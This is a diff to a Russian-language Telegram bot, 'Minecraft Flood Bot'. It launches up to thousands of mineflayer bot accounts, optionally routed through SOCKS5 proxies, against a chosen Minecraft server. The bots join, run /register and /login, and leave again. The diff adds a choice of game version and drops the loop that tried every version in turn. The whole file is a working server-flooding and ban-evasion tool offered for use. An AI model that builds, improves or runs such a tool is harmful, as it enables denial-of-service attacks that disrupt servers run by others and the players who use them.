@@ -53,59 +53,28 @@ const ALL_VERSIONS = [
     '1.3.2', '1.3.1',
     '1.2.5', '1.2.4', '1.2.3', '1.2.2', '1.2.1',
     '1.1',
-    '1.0.1', '1.0.0',
-    // Beta версии
-    'Beta 1.9pre6', 'Beta 1.9pre5', 'Beta 1.9pre4', 'Beta 1.9pre3', 'Beta 1.9pre2', 'Beta 1.9pre',
-    'Beta 1.8.1', 'Beta 1.8',
-    'Beta 1.7.3', 'Beta 1.7.2', 'Beta 1.7.1', 'Beta 1.7_01', 'Beta 1.7',
-    'Beta 1.6.6', 'Beta 1.6.5', 'Beta 1.6.4', 'Beta 1.6.3', 'Beta 1.6.2', 'Beta 1.6.1', 'Beta 1.6',
-    'Beta 1.5_02', 'Beta 1.5_01', 'Beta 1.5',
-    'Beta 1.4_01', 'Beta 1.4',
-    'Beta 1.3_01', 'Beta 1.3',
-    'Beta 1.1_02', 'Beta 1.1_01', 'Beta 1.1',
-    'Beta 1.0.2', 'Beta 1.0_01', 'Beta 1.0',
-    // Alpha версии
-    'Alpha v1.2.6', 'Alpha v1.2.5', 'Alpha v1.2.4_01', 'Alpha v1.2.4',
-    'Alpha v1.2.3_04', 'Alpha v1.2.3_03', 'Alpha v1.2.3_02', 'Alpha v1.2.3_01', 'Alpha v1.2.3',
-    'Alpha v1.2.2', 'Alpha v1.2.1_01', 'Alpha v1.2.1',
-    'Alpha v1.2.0_02', 'Alpha v1.2.0_01', 'Alpha v1.2.0',
-    'Alpha v1.1.2_01', 'Alpha v1.1.2', 'Alpha v1.1.1', 'Alpha v1.1.0',
-    'Alpha v1.0.17_04', 'Alpha v1.0.17_03', 'Alpha v1.0.17_01', 'Alpha v1.0.17',
-    'Alpha v1.0.16_02', 'Alpha v1.0.16_01', 'Alpha v1.0.16',
-    'Alpha v1.0.15',
-    'Alpha v1.0.14_01', 'Alpha v1.0.14',
-    'Alpha v1.0.13_02', 'Alpha v1.0.13_01', 'Alpha v1.0.13',
-    'Alpha v1.0.12', 'Alpha v1.0.11',
-    'Alpha v1.0.10', 'Alpha v1.0.9',
-    'Alpha v1.0.8_01', 'Alpha v1.0.8',
-    'Alpha v1.0.7',
-    'Alpha v1.0.6_03', 'Alpha v1.0.6_02', 'Alpha v1.0.6_01', 'Alpha v1.0.6',
-    'Alpha v1.0.5_01', 'Alpha v1.0.5',
-    'Alpha v1.0.4',
-    'Alpha v1.0.3',
-    'Alpha v1.0.2_02', 'Alpha v1.0.2_01', 'Alpha v1.0.2',
-    'Alpha v1.0.1_01', 'Alpha v1.0.1',
-    'Alpha v1.0.0',
-    // Infdev версии
-    '20100630', '20100629', '20100627', '20100625-2', '20100625-1', '20100624', '20100618',
-    '20100617-3', '20100617-2', '20100617-1', '20100616', '20100615', '20100611', '20100608',
-    '20100607', '20100420', '20100415', '20100414', '20100413', '20100330', '20100327', '20100325',
-    '20100321', '20100320', '20100616', '20100313', '20100227',
-    // Indev версии
-    '20100223', '20100219', '20100218', '20100214-2', '20100214-1', '20100212-2', '20100212-1',
-    '20100207-2', '20100207-1', '20100206', '20100205', '20100204-2', '20100204-1', '20100203',
-    '20100201-3', '20100201-2', '20100201-1', '20100130', '20100129', '20100128', '20100125-2',
-    '20100125-1', '20100124', '20100122', '20100114', '20100113', '20100111-2', '20100111-1',
-    '20100109', '20100107', '20100106', '20100105', '20091231-2', '20091231-1', '20091223-2',
-    '20091223-1'
+    '1.0.1', '1.0.0'
+];
+
+// ========== ПОПУЛЯРНЫЕ ВЕРСИИ ДЛЯ БЫСТРОГО ВЫБОРА ==========
+const POPULAR_VERSIONS = [
+    '1.21.3', '1.21.2', '1.21.1', '1.21',
+    '1.20.4', '1.20.1',
+    '1.19.4', '1.19.2',
+    '1.18.2',
+    '1.17.1',
+    '1.16.5',
+    '1.12.2',
+    '1.8.9'
 ];
 
 // ========== КЛАСС MINECRAFT БОТА ==========
 class FloodBot {
-    constructor(name, host, port, proxy = null, onComplete = null) {
+    constructor(name, host, port, version = null, proxy = null, onComplete = null) {
         this.name = name;
         this.host = host;
         this.port = port;
+        this.version = version;
         this.proxy = proxy;
         this.onComplete = onComplete;
         this.bot = null;
@@ -114,75 +83,9 @@ class FloodBot {
         console.log(`🤖 [${this.name}] Создан`);
     }
 
-    async tryConnectWithVersions() {
-        console.log(`🔍 [${this.name}] Пробую все версии из списка...`);
-
-        // Сначала пробуем все версии из списка
-        for (const version of ALL_VERSIONS) {
-            try {
-                console.log(`🔄 [${this.name}] Пробую версию ${version}...`);
-                
-                const options = {
-                    host: this.host,
-                    port: this.port,
-                    username: this.name,
-                    offline: true,
-                    version: version,
-                    viewDistance: 'tiny'
-                };
-
-                if (this.proxy) {
-                    const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
-                    options.agent = new SocksProxyAgent(proxyUrl);
-                }
-
-                this.bot = mineflayer.createBot(options);
-
-                const success = await new Promise((resolve) => {
-                    const timeout = setTimeout(() => {
-                        if (this.bot) {
-                            this.bot.end();
-                            console.log(`⏱️ [${this.name}] Таймаут версии ${version}`);
-                        }
-                        resolve(false);
-                    }, 8000);
-
-                    this.bot.once('login', () => {
-                        clearTimeout(timeout);
-                        console.log(`✅ [${this.name}] УСПЕХ! Версия ${version} подошла!`);
-                        resolve(true);
-                    });
-
-                    this.bot.once('error', (err) => {
-                        clearTimeout(timeout);
-                        if (this.bot) this.bot.end();
-                        if (err.message.includes('version')) {
-                            console.log(`❌ [${this.name}] Версия ${version} не подходит`);
-                        } else {
-                            console.log(`❌ [${this.name}] Ошибка: ${err.message}`);
-                        }
-                        resolve(false);
-                    });
-                });
-
-                if (success) {
-                    return true;
-                }
-
-                if (this.bot) {
-                    this.bot.end();
-                    this.bot = null;
-                }
-
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-            } catch (err) {
-                console.log(`❌ [${this.name}] Ошибка с версией ${version}:`, err.message);
-            }
-        }
-
-        // Если ни одна версия не подошла, пробуем автоопределение
-        console.log(`🔄 [${this.name}] Пробую автоопределение...`);
+    async tryConnect() {
+        console.log(`🔍 [${this.name}] Пробую версию ${this.version || 'авто'}...`);
+        
         try {
             const options = {
                 host: this.host,
@@ -192,6 +95,10 @@ class FloodBot {
                 viewDistance: 'tiny'
             };
 
+            if (this.version) {
+                options.version = this.version;
+            }
+
             if (this.proxy) {
                 const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
                 options.agent = new SocksProxyAgent(proxyUrl);
@@ -199,36 +106,43 @@ class FloodBot {
 
             this.bot = mineflayer.createBot(options);
 
-            const success = await new Promise((resolve) => {
+            return await new Promise((resolve) => {
                 const timeout = setTimeout(() => {
-                    if (this.bot) this.bot.end();
+                    if (this.bot) {
+                        this.bot.end();
+                        console.log(`⏱️ [${this.name}] Таймаут версии ${this.version || 'авто'}`);
+                    }
                     resolve(false);
-                }, 10000);
+                }, 8000);
 
                 this.bot.once('login', () => {
                     clearTimeout(timeout);
-                    console.log(`✅ [${this.name}] Автоопределение сработало!`);
+                    console.log(`✅ [${this.name}] УСПЕХ! Версия ${this.version || 'авто'} подошла!`);
                     resolve(true);
                 });
 
-                this.bot.once('error', () => {
+                this.bot.once('error', (err) => {
                     clearTimeout(timeout);
+                    if (this.bot) this.bot.end();
+                    if (err.message.includes('version')) {
+                        console.log(`❌ [${this.name}] Версия ${this.version || 'авто'} не подходит`);
+                    } else {
+                        console.log(`❌ [${this.name}] Ошибка: ${err.message}`);
+                    }
                     resolve(false);
                 });
             });
 
-            if (success) return true;
         } catch (err) {
-            console.log(`❌ [${this.name}] Ошибка автоопределения`);
+            console.log(`❌ [${this.name}] Ошибка:`, err.message);
+            return false;
         }
-
-        return false;
     }
 
     async start() {
         this.running = true;
         
-        const connected = await this.tryConnectWithVersions();
+        const connected = await this.tryConnect();
         
         if (!connected) {
             console.log(`❌ [${this.name}] Не удалось подключиться`);
@@ -290,12 +204,13 @@ class FloodBot {
 
 // ========== КЛАСС УПРАВЛЕНИЯ ФЛУДОМ ==========
 class FloodManager {
-    constructor(floodId, chatId, host, port, botCount, proxies = []) {
+    constructor(floodId, chatId, host, port, botCount, version = null, proxies = []) {
         this.floodId = floodId;
         this.chatId = chatId;
         this.host = host;
         this.port = port;
         this.botCount = botCount;
+        this.version = version;
         this.proxies = proxies;
         
         this.bots = [];
@@ -325,7 +240,7 @@ class FloodManager {
 
     start() {
         this.running = true;
-        console.log(`🚀 Запуск флуда ${this.floodId} с ${this.botCount} ботами`);
+        console.log(`🚀 Запуск флуда ${this.floodId} с ${this.botCount} ботами (версия: ${this.version || 'авто'})`);
 
         for (let i = 0; i < this.botCount; i++) {
             setTimeout(() => {
@@ -348,6 +263,7 @@ class FloodManager {
             name,
             this.host,
             this.port,
+            this.version,
             proxy,
             (success) => this.onBotComplete(success)
         );
@@ -392,7 +308,8 @@ class FloodManager {
             failed: this.stats.failed,
             percent,
             uptime: `${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`,
-            total: this.stats.total
+            total: this.stats.total,
+            version: this.version || 'авто'
         };
     }
 
@@ -433,7 +350,7 @@ bot.start(async (ctx) => {
     await ctx.replyWithHTML(
         '<b>🤖 Minecraft Flood Bot</b>\n\n' +
         'Запускает ботов которые заходят и выходят с сервера!\n' +
-        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ</b>\n\n' +
+        '<b>✅ ТЕПЕРЬ С ВЫБОРОМ ВЕРСИИ!</b>\n\n' +
         'Выберите действие:',
         keyboard
     );
@@ -543,6 +460,84 @@ bot.action(/select_server_(\d+)/, async (ctx) => {
     
     ctx.session = { server };
     
+    // Кнопки выбора версии
+    const versionButtons = [
+        [Markup.button.callback('🔄 Автоопределение', 'version_auto')],
+        [Markup.button.callback('⭐ Популярные версии', 'popular_versions')],
+        [Markup.button.callback('📋 Все версии', 'all_versions')],
+        [Markup.button.callback('✏️ Своя версия', 'version_custom')],
+        [Markup.button.callback('⬅️ Назад', 'start_flood')]
+    ];
+    
+    await ctx.replyWithHTML(
+        `<b>⚙️ Настройка флуда для ${server.name}</b>\n\n` +
+        'Выберите версию Minecraft:',
+        Markup.inlineKeyboard(versionButtons)
+    );
+});
+
+bot.action('version_auto', async (ctx) => {
+    ctx.session.version = null;
+    await askBotCount(ctx);
+});
+
+bot.action('popular_versions', async (ctx) => {
+    const buttons = [];
+    // Создаем кнопки для популярных версий (по 3 в ряд)
+    for (let i = 0; i < POPULAR_VERSIONS.length; i += 3) {
+        const row = [];
+        for (let j = 0; j < 3 && i + j < POPULAR_VERSIONS.length; j++) {
+            const ver = POPULAR_VERSIONS[i + j];
+            row.push(Markup.button.callback(ver, `version_${ver}`));
+        }
+        buttons.push(row);
+    }
+    buttons.push([Markup.button.callback('⬅️ Назад', `select_server_${ctx.session.serverIndex}`)]);
+    
+    await ctx.editMessageText(
+        '<b>⭐ Популярные версии</b>\n\nВыберите версию:',
+        Markup.inlineKeyboard(buttons)
+    );
+});
+
+bot.action('all_versions', async (ctx) => {
+    const buttons = [];
+    // Покажем первые 12 версий, остальные можно будет листать
+    const displayVersions = ALL_VERSIONS.slice(0, 12);
+    
+    for (let i = 0; i < displayVersions.length; i += 3) {
+        const row = [];
+        for (let j = 0; j < 3 && i + j < displayVersions.length; j++) {
+            const ver = displayVersions[i + j];
+            row.push(Markup.button.callback(ver, `version_${ver}`));
+        }
+        buttons.push(row);
+    }
+    buttons.push([Markup.button.callback('⬅️ Назад', `select_server_${ctx.session.serverIndex}`)]);
+    
+    await ctx.editMessageText(
+        '<b>📋 Все версии (первые 12)</b>\n\n' +
+        'Если нужной версии нет в списке, выберите "Своя версия"',
+        Markup.inlineKeyboard(buttons)
+    );
+});
+
+bot.action('version_custom', async (ctx) => {
+    ctx.session.state = 'awaiting_version';
+    await ctx.editMessageText(
+        '✏️ Введите версию Minecraft (например: 1.16.5, 1.19.2, 1.20.1):'
+    );
+});
+
+bot.action(/version_(.+)/, async (ctx) => {
+    const version = ctx.match[1];
+    if (version === 'auto' || version === 'popular' || version === 'all' || version === 'custom') return;
+    
+    ctx.session.version = version;
+    await askBotCount(ctx);
+});
+
+async function askBotCount(ctx) {
     const buttons = [
         [Markup.button.callback('10 ботов', 'count_10')],
         [Markup.button.callback('20 ботов', 'count_20')],
@@ -550,15 +545,18 @@ bot.action(/select_server_(\d+)/, async (ctx) => {
         [Markup.button.callback('100 ботов', 'count_100')],
         [Markup.button.callback('500 ботов', 'count_500')],
         [Markup.button.callback('🔄 Свое число', 'count_custom')],
-        [Markup.button.callback('⬅️ Назад', 'start_flood')]
+        [Markup.button.callback('⬅️ Назад', `select_server_${ctx.session.serverIndex}`)]
     ];
     
-    await ctx.replyWithHTML(
-        `<b>⚙️ Настройка флуда для ${server.name}</b>\n\n` +
+    const versionText = ctx.session.version ? `Версия: ${ctx.session.version}` : 'Версия: автоопределение';
+    
+    await ctx.editMessageText(
+        `<b>⚙️ Настройка флуда</b>\n\n` +
+        `${versionText}\n\n` +
         'Выберите количество ботов:',
         Markup.inlineKeyboard(buttons)
     );
-});
+}
 
 ['10', '20', '50', '100', '500'].forEach(num => {
     bot.action(`count_${num}`, async (ctx) => {
@@ -569,7 +567,7 @@ bot.action(/select_server_(\d+)/, async (ctx) => {
 
 bot.action('count_custom', async (ctx) => {
     ctx.session.state = 'awaiting_custom_count';
-    await ctx.reply('✏️ Введите количество ботов (число):');
+    await ctx.editMessageText('✏️ Введите количество ботов (число):');
 });
 
 async function askForProxies(ctx) {
@@ -586,7 +584,7 @@ async function askForProxies(ctx) {
     
     buttons.push([Markup.button.callback('⬅️ Назад', 'start_flood')]);
     
-    await ctx.replyWithHTML(
+    await ctx.editMessageText(
         '<b>🔄 Нужны прокси?</b>',
         Markup.inlineKeyboard(buttons)
     );
@@ -604,7 +602,7 @@ bot.action('use_proxy', async (ctx) => {
 
 async function startFlood(ctx, proxies) {
     const floodId = `flood_${++floodCounter}`;
-    const { server, botCount } = ctx.session;
+    const { server, botCount, version } = ctx.session;
     const chatId = ctx.chat.id;
     
     const manager = new FloodManager(
@@ -613,6 +611,7 @@ async function startFlood(ctx, proxies) {
         server.host,
         server.port,
         botCount,
+        version,
         proxies
     );
     
@@ -629,10 +628,13 @@ async function startFlood(ctx, proxies) {
         [Markup.button.callback('⏹️ Остановить', `stop_${floodId}`)]
     ]);
     
+    const versionText = version ? `Версия: ${version}` : 'Версия: авто';
+    
     await ctx.replyWithHTML(
         `<b>🚀 Флуд запущен!</b>\n\n` +
         `ID: <code>${floodId}</code>\n` +
         `Сервер: ${server.host}:${server.port}\n` +
+        `${versionText}\n` +
         `Ботов: ${botCount}\n` +
         `Прокси: ${proxies.length > 0 ? '✅' + proxies.length : '❌'}\n\n` +
         `Боты начали заходить...`,
@@ -655,7 +657,7 @@ bot.action('active_floods', async (ctx) => {
     for (const [id, manager] of activeFloods) {
         const stats = manager.getStats();
         buttons.push([Markup.button.callback(
-            `${id} - ${stats.active} ботов (${stats.percent}%)`,
+            `${id} - ${stats.active} ботов (${stats.percent}%) ${stats.version}`,
             `stats_${id}`
         )]);
     }
@@ -680,6 +682,7 @@ bot.action(/stats_(.+)/, async (ctx) => {
     
     const text = 
         `<b>📊 Статистика ${floodId}</b>\n\n` +
+        `Версия: ${stats.version}\n` +
         `Активно: ${stats.active} ботов\n` +
         `✅ Успешно: ${stats.successful}\n` +
         `❌ Не удалось: ${stats.failed}\n` +
@@ -756,10 +759,12 @@ bot.action('help', async (ctx) => {
         '1️⃣ Добавьте сервер через "➕ Добавить сервер"\n' +
         '2️⃣ Загрузите прокси (опционально)\n' +
         '3️⃣ Запустите флуд через "🚀 Запустить флуд"\n' +
-        '4️⃣ Следите за статистикой\n\n' +
+        '4️⃣ Выберите версию Minecraft\n' +
+        '5️⃣ Выберите количество ботов\n' +
+        '6️⃣ Следите за статистикой\n\n' +
         
         '<b>Что делают боты:</b>\n' +
-        '• Заходят на сервер\n' +
+        '• Заходят на сервер с выбранной версией\n' +
         '• Регистрируются (/register пароль)\n' +
         '• Логинятся (/login пароль)\n' +
         '• Стоят 5-15 секунд\n' +
@@ -792,7 +797,7 @@ bot.action('main_menu', async (ctx) => {
     await ctx.editMessageText(
         '<b>🤖 Minecraft Flood Bot</b>\n\n' +
         'Запускает ботов которые заходят и выходят с сервера!\n' +
-        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ</b>\n\n' +
+        '<b>✅ ТЕПЕРЬ С ВЫБОРОМ ВЕРСИИ!</b>\n\n' +
         'Выберите действие:',
         {
             parse_mode: 'HTML',
@@ -867,9 +872,19 @@ bot.on('text', async (ctx) => {
             return;
         }
         
-        if (ctx.session.state === 'awaiting_custom_count') {
-            console.log('🔄 Обработка количества ботов');
+        if (ctx.session.state === 'awaiting_version') {
+            const version = text.trim();
+            // Простая проверка формата версии
+            if (!/^\d+\.\d+(\.\d+)?$/.test(version)) {
+                return ctx.reply('❌ Неверный формат. Используйте например: 1.16.5, 1.19.2, 1.20.1');
+            }
             
+            ctx.session.version = version;
+            await askBotCount(ctx);
+            return;
+        }
+        
+        if (ctx.session.state === 'awaiting_custom_count') {
             const count = parseInt(text);
             if (isNaN(count) || count < 1 || count > 10000) {
                 console.log('❌ Неверное число');
@@ -958,7 +973,7 @@ bot.on('document', async (ctx) => {
 bot.launch();
 console.log('\n' + '='.repeat(50));
 console.log('🤖 Minecraft Flood Bot запущен!');
-console.log('✅ Поддержка всех версий Minecraft');
+console.log('✅ Поддержка выбора версии');
 console.log('👑 Владелец: @artem_bori');
 console.log('='.repeat(50) + '\n');
 
